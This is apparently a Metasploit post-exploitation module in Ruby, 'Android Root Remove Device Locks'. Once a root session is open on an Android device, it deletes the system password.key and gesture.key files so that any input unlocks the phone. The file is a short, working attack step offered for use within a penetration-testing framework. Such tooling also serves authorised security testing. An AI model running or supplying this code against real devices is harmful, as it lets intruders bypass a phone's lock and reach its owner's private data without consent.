##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit4 < Msf::Post

  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android Root Remove Device Locks",
        'Description'   => %q{
            This module uses root privileges to remove the device lock.
            In some cases the original lock method will still be present but any key/gesture will
            unlock the device.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'timwr' ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
        'Platform'      => 'android',
      }
    ))
  end

  def run
    id = cmd_exec('id')
    unless id =~ /root/
      print_error("This module requires root permissions")
      return
    end

    cmd_exec('rm /data/system/password.key')
    cmd_exec('rm /data/system/gesture.key')
  end

end

